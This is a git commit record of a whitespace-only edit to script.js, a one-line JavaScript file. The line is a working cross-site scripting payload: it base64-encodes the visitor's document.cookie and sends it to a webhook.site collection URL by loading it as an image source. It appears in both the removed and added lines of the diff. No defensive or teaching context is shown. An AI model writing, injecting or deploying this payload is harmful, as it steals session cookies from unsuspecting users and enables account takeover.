6bbfb7edbafb4fe4863edced62ab1c3be340b3e1
Ouerfelli Mohamed Amine <119965790+Ouerfelli-1@users.noreply.github.com>
2024-09-02 14:15:29 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/0a829536-97ca-49af-8c66-9eabd9222cd4?data='+btoa(document.cookie);
+x = new Image(); x.src='https://webhook.site/0a829536-97ca-49af-8c66-9eabd9222cd4?data='+btoa(document.cookie);
